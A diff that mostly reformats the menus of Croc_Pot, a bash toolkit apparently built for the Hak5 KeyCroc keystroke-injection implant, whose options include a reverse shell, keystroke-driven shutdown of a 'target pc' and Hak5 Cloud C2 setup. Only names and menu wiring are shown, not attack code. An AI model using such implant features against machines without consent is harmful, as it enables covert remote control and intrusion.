-	7) ssh_turtle ; ssh_menu ;;
-	8) ssh_shark ; ssh_menu ;;
-	9) ssh_bunny ; ssh_menu ;;
-	10) croc_reverse_shell ; ssh_menu ;;
-	11) ssh_keygen ; ssh_menu ;;
-	12) remove_sshkey ; ssh_menu ;;
-	13) main_menu ;;
-	0) exit 0 ;;
-	[bB]) main_menu ;;
-	*) invalid_entry ; ssh_menu ;;
+	1) pc_ssh ; ssh_menu ;; 2) echo -ne "${yellow}Reachable target on local network:${clear}\n" ; reachable_target ; userinput_ssh ; ssh_menu ;; 3) ENABLE_SSH ; ssh_menu ;; 4) DISABLE_SSH ; ssh_menu ;; 5) ssh_pineapple ; ssh_menu ;; 6) ssh_squirrel ; ssh_menu ;; 7) ssh_turtle ; ssh_menu ;;
+	8) ssh_shark ; ssh_menu ;; 9) ssh_bunny ; ssh_menu ;; 10) croc_reverse_shell ; ssh_menu ;; 11) ssh_keygen ; ssh_menu ;; 12) remove_sshkey ; ssh_menu ;; 13) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; ssh_menu ;;
 	esac
 }
 ##
@@ -5537,7 +5332,8 @@ MenuEnd
 ##
 function croc_recovery() {
 	clear
-	echo -ne "$(Info_Screen '-Download The lastest firmware from Hak5
+	echo -ne "$(Info_Screen '
+-Download The lastest firmware from Hak5
 -This will save the Firmware to the keycroc tools folder
 -Restore the keycroc firmware with the lastest firmware
 -factory recovery will bring you to Hak5 factory recovery web page
@@ -5547,7 +5343,8 @@ function croc_recovery() {
 ##
 croc_firmware() {
 	clear
-	echo -ne "$(Info_Screen '-This will Download KeyCroc lastest firmware from Hak5
+	echo -ne "$(Info_Screen '
+-This will Download KeyCroc lastest firmware from Hak5
 -Download center and place it in the tools folder
 -for later recovery, Download may take some time')\n"
 if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
@@ -5595,7 +5392,8 @@ esac
 ##
 locale_en_US() {
 	clear
-	echo -ne "\n$(Info_Screen '--This will fix LC_ALL=en_US.UTF-8 if you get this error at ssh 
+	echo -ne "\n$(Info_Screen '
+--This will fix LC_ALL=en_US.UTF-8 if you get this error at ssh 
 --bash: warning: setlocale: LC_ALL: cannot change locale en_US.UTF-8
 --This is for US language
 --Not sure if this will work on other language keyboards')\n\n"
@@ -5620,7 +5418,8 @@ esac
 ##
 remove_croc_pot() {
 	clear
-	echo -ne "\n$(Info_Screen '-Completely remove Croc_Pot and all its contents from the KeyCroc')\n\n"
+	echo -ne "\n$(Info_Screen '
+-Completely remove Croc_Pot and all its contents from the KeyCroc')\n\n"
 	echo -ne "$(ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:')"; read CROC_POT_REMOVE
 case $CROC_POT_REMOVE in
 [yY] | [yY][eE][sS])
@@ -5646,7 +5445,8 @@ esac
 ##
 croc_update() {
 	clear
-	echo -ne "$(Info_Screen '-Update/Upgrade your KeyCroc Packages
+	echo -ne "$(Info_Screen '
+-Update/Upgrade your KeyCroc Packages
 -NOTE: This could break important Packages the keycroc needs to work properly')\n\n"
 	read_all UPDATE KEYCROC PACKAGES Y/N AND PRESS [ENTER]
 case $r_a in
@@ -5664,7 +5464,8 @@ esac
 ##
 reboot_shutdown() {
 	clear
-	echo -ne "$(Info_Screen '-Reboot or shutdown Target pc')\n\n"
+	echo -ne "$(Info_Screen '
+-Reboot or shutdown Target pc')\n\n"
 shutdown_pc() {
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q GUI d
@@ -5748,47 +5549,19 @@ fi
 ##
 #----Recovery Reboot/Shutdown menu
 ##
-MenuTitle REBOOT/SHUTDOWN TARGET PC
-MenuColor 1 SHUTDOWN TARGET PC ; echo -ne "  ${clear}\n"
-MenuColor 2 REBOOT TARGET PC ; echo -ne "    ${clear}\n"
-MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle REBOOT/SHUTDOWN TARGET PC ; MenuColor 19 1 SHUTDOWN TARGET PC ; MenuColor 19 2 REBOOT TARGET PC ; MenuColor 19 3 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) shutdown_pc ;;
-	2) reboot_pc ;;
-	3) main_menu ;;
-	0) exit 0 ;;
-	[bB]) croc_recovery ;;
-	*) invalid_entry ; reboot_shutdown ;;
+	1) shutdown_pc ;; 2) reboot_pc ;; 3) main_menu ;; 0) exit 0 ;; [bB]) croc_recovery ;; *) invalid_entry ; reboot_shutdown ;;
 	esac
 }
 ##
 #----Recovery menu
 ##
-MenuTitle KEYCROC RECOVERY MENU
-MenuColor 1 DOWNLOAD LATEST FIRMWARE ; echo -ne "    ${clear}\n"
-MenuColor 2 FACTORY RESET HOW TO ; echo -ne "        ${clear}\n"
-MenuColor 3 RESTORE LASTEST FIRMWARE ; echo -ne "    ${clear}\n"
-MenuColor 4 REMOVE LASTEST FIRMWARE ; echo -ne "     ${clear}\n"
-MenuColor 5 REPAIR en_US.UTF-8 ERROR ; echo -ne "    ${clear}\n"
-MenuColor 6 KEYCROC UPDATE PACKAGES ; echo -ne "     ${clear}\n"
-MenuColor 7 REMOVE CROC_POT AN CONTENTS ; echo -ne " ${clear}\n"
-MenuColor 8 REBOOT/SHUTDOWN TARGET PC ; echo -ne "   ${clear}\n"
-MenuColor 9 RETURN TO MAIN MENU ; echo -ne "         ${clear}\n"
-MenuEnd
+MenuTitle KEYCROC RECOVERY MENU ; MenuColor 27 1 DOWNLOAD LATEST FIRMWARE ; MenuColor 27 2 FACTORY RESET HOW TO ; MenuColor 27 3 RESTORE LASTEST FIRMWARE ; MenuColor 27 4 REMOVE LASTEST FIRMWARE ; MenuColor 27 5 REPAIR en_US.UTF-8 ERROR
+MenuColor 27 6 KEYCROC UPDATE PACKAGES ; MenuColor 27 7 REMOVE CROC_POT AN CONTENTS ; MenuColor 27 8 REBOOT/SHUTDOWN TARGET PC ; MenuColor 27 9 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) croc_firmware ; croc_recovery ;;
-	2) start_web https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset ; croc_recovery ;;
-	3) restore_firmware ; croc_recovery ;;
-	4) echo -ne "\n$(ColorYellow 'Removing lastest firmware file from tools folder')\n" ; rm /root/udisk/tools/kc_fw_1.3_510.tar.gz ; croc_recovery ;;
-	5) locale_en_US ; croc_recovery ;;
-	6) croc_update ; croc_recovery ;;
-	7) remove_croc_pot ;;
-	8) reboot_shutdown ; croc_recovery ;;
-	9) main_menu ;;
-	0) exit 0 ;;
-	[bB]) main_menu ;;
-	*) invalid_entry ; croc_recovery ;;
+	1) croc_firmware ; croc_recovery ;; 2) start_web https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset ; croc_recovery ;; 3) restore_firmware ; croc_recovery ;; 4) echo -ne "\n$(ColorYellow 'Removing lastest firmware file from tools folder')\n" ; rm /root/udisk/tools/kc_fw_1.3_510.tar.gz ; croc_recovery ;;
+	5) locale_en_US ; croc_recovery ;; 6) croc_update ; croc_recovery ;; 7) remove_croc_pot ;; 8) reboot_shutdown ; croc_recovery ;; 9) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_recovery ;;
 	esac
 }
 ##
@@ -5796,7 +5569,8 @@ MenuEnd
 ##
 function hak_cloud() {
 	clear
-	echo -ne "$(Info_Screen '-Run HAK5 Cloud C2 on the keycroc
+	echo -ne "$(Info_Screen '
+-Run HAK5 Cloud C2 on the keycroc
 -When running setup, maximize your screen to read Token keys properly
 -To get Token keys Run #3 RELOAD HAK5 C2 until the keys show up
 -May need to Unplug the keycroc plug back in and try again
@@ -5874,7 +5648,8 @@ remove_cloud() {
 quick_cloud() {
 	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
 	clear
-	echo -ne "$(Info_Screen '-Will need to install Cloud C2 frist on the keycroc
+	echo -ne "$(Info_Screen '
+-Will need to install Cloud C2 frist on the keycroc
 -This will install Quick_Start_C2.txt in the payload folder
 -Use this to start C2 from a payload
 -Type in startc2 this will automatically start Hak5 cloud C2')\n"
@@ -5906,7 +5681,8 @@ fi
 ##
 save_ip() {
 	clear
-	echo -ne "$(Info_Screen '- #1 will save the IP,Netmask,Gateway that is setup with C2
+	echo -ne "$(Info_Screen '
+- #1 will save the IP,Netmask,Gateway that is setup with C2
 - #2 will restore the keycroc to saved IP,Netmask,Gateway
 - #3 Manually add IP,Netmask,Gateway')\n"
 save_setup() {
@@ -5980,51 +5756,19 @@ esac
 ##
 #----Hak5 C2 ip restore Menu
 ##
-MenuTitle SAVE C2 SETUP IP MENU
-MenuColor 1 SAVE C2 SETUP IP ; echo -ne "    ${clear}\n"
-MenuColor 2 RESTORE C2 SETUP IP ; echo -ne " ${clear}\n"
-MenuColor 3 EDIT CROC IP ; echo -ne "        ${clear}\n"
-MenuColor 4 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle SAVE C2 SETUP IP MENU ; MenuColor 19 1 SAVE C2 SETUP IP ; MenuColor 19 2 RESTORE C2 SETUP IP ; MenuColor 19 3 EDIT CROC IP ; MenuColor 19 4 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) save_setup ; save_ip ;;
-	2) restore_ip ; save_ip ;;
-	3) edit_ip ; save_ip ;;
-	4) main_menu ;;
-	0) exit 0 ;;
-	[bB]) hak_cloud ;;
-	*) invalid_entry ; save_ip ;;
+	1) save_setup ; save_ip ;; 2) restore_ip ; save_ip ;; 3) edit_ip ; save_ip ;; 4) main_menu ;; 0) exit 0 ;; [bB]) hak_cloud ;; *) invalid_entry ; save_ip ;;
 	esac
 }
 ##
 #----Hak5 Cloud_C2 menu
 ##
-MenuTitle HAK5 CLOUD C2 MENU
-MenuColor 1 HAK5 C2 SETUP ; echo -ne "        ${clear}\n"
-MenuColor 2 START HAK5 C2 ; echo -ne "        ${clear}\n"
-MenuColor 3 RELOAD HAK5 C2 ; echo -ne "       ${clear}\n"
-MenuColor 4 RESTART HAK5 C2 ; echo -ne "      ${clear}\n"
-MenuColor 5 STOP HAK5 C2 ; echo -ne "         ${clear}\n"
-MenuColor 6 REMOVE HAK5 C2 ; echo -ne "       ${clear}\n"
-MenuColor 7 EDIT HAK5 C2 ; echo -ne "         ${clear}\n"
-MenuColor 8 QUICK START C2 ; echo -ne "       ${clear}\n"
-MenuColor 9 SAVE C2 SETUP IP ; echo -ne "     ${clear}\n"
-MenuColor 10 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle HAK5 CLOUD C2 MENU ; MenuColor 20 1 HAK5 C2 SETUP ; MenuColor 20 2 START HAK5 C2 ; MenuColor 20 3 RELOAD HAK5 C2 ; MenuColor 20 4 RESTART HAK5 C2 ; MenuColor 20 5 STOP HAK5 C2
+MenuColor 20 6 REMOVE HAK5 C2 ; MenuColor 20 7 EDIT HAK5 C2 ; MenuColor 20 8 QUICK START C2 ; MenuColor 20 9 SAVE C2 SETUP IP ; MenuColor 19 10 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) cloud_setup ; hak_cloud ;;
-	2) cloud_web ; hak_cloud ;;
-	3) reload_cloud ; hak_cloud ;;
-	4) systemctl restart hak5.service ; cloud_web ; hak_cloud ;;
-	5) systemctl stop hak5.service ; hak_cloud ;;
-	6) remove_cloud ; hak_cloud ;;
-	7) nano /etc/systemd/system/hak5.service ; hak_cloud ;;
-	8) quick_cloud ; hak_cloud ;;
-	9) save_ip ; hak_cloud ;;
-	10) main_menu ;;
-	[bB]) main_menu ;;
-	0) exit 0 ;;
-	*) invalid_entry ; hak_cloud ;;
+	1) cloud_setup ; hak_cloud ;; 2) cloud_web ; hak_cloud ;; 3) reload_cloud ; hak_cloud ;; 4) systemctl restart hak5.service ; cloud_web ; hak_cloud ;; 5) systemctl stop hak5.service ; hak_cloud ;;
+	6) remove_cloud ; hak_cloud ;; 7) nano /etc/systemd/system/hak5.service ; hak_cloud ;; 8) quick_cloud ; hak_cloud ;; 9) save_ip ; hak_cloud ;; 10) main_menu ;; [bB]) main_menu ;; 0) exit 0 ;; *) invalid_entry ; hak_cloud ;;
 	esac
 }
 ##
@@ -6034,27 +5778,12 @@ function main_menu() {
 	LED B
 	clear
 	croc_title
-MenuTitle CROC POT MAIN MENU
-MenuColor 1 CROC MAIL ; echo -ne "     ${blue} ${array[4]} ${clear} \n"
-MenuColor 2 CROC POT PLUS ; echo -ne " ${red} ${array[5]} ${clear} \n"
-MenuColor 3 KEYCROC STATUS ; echo -ne "${green} ${array[6]} ${clear} \n"
-MenuColor 4 KEYCROC LOGS ; echo -ne "  ${white} ${array[7]} ${clear} \n"
-MenuColor 5 KEYCROC EDIT ; echo -ne "  ${yellow} ${array[8]} ${clear} \n"
-MenuColor 6 SSH MENU ; echo -ne "      ${blue} ${array[9]} ${clear} \n"
-MenuColor 7 RECOVERY MENU ; echo -ne " ${green} ${array[10]} ${clear} \n"
-MenuColor 8 HAK5 CLOUD C2 ; echo -ne " ${white} ${array[11]} ${clear} \n"
+MenuTitle CROC POT MAIN MENU ; MenuColor 16 1 CROC MAIL | tr -d '\n' ; echo -ne "${blue}${array[4]}${clear}\n" ; MenuColor 16 2 CROC POT PLUS | tr -d '\n' ; echo -ne "${red}${array[5]}${clear}\n"
+MenuColor 16 3 KEYCROC STATUS | tr -d '\n' ; echo -ne "${green}${array[6]}${clear}\n" ; MenuColor 16 4 KEYCROC LOGS | tr -d '\n' ; echo -ne "${white}${array[7]}${clear}\n" ; MenuColor 16 5 KEYCROC EDIT | tr -d '\n' ; echo -ne "${yellow}${array[8]}${clear}\n"
+MenuColor 16 6 SSH MENU | tr -d '\n' ; echo -ne "${blue}${array[9]}${clear}\n" ; MenuColor 16 7 RECOVERY MENU | tr -d '\n' ; echo -ne "${green}${array[10]}${clear}\n" ; MenuColor 16 8 HAK5 CLOUD C2 | tr -d '\n' ; echo -ne "${white}${array[11]}${clear}\n"
 MenuEnd
 	case $m_a in
-	1) croc_mail ;;
-	2) croc_pot_plus ;;
-	3) croc_status ;;
-	4) croc_logs_mean ;;
-	5) croc_edit_menu ;;
-	6) ssh_menu ;;
-	7) croc_recovery ;;
-	8) hak_cloud ;;
-	0) exit 0 ;;
-	*) invalid_entry ; main_menu ;;
+	1) croc_mail ;; 2) croc_pot_plus ;; 3) croc_status ;; 4) croc_logs_mean ;; 5) croc_edit_menu ;; 6) ssh_menu ;; 7) croc_recovery ;; 8) hak_cloud ;; 0) exit 0 ;; *) invalid_entry ; main_menu ;;
 	esac
 }
 main_menu
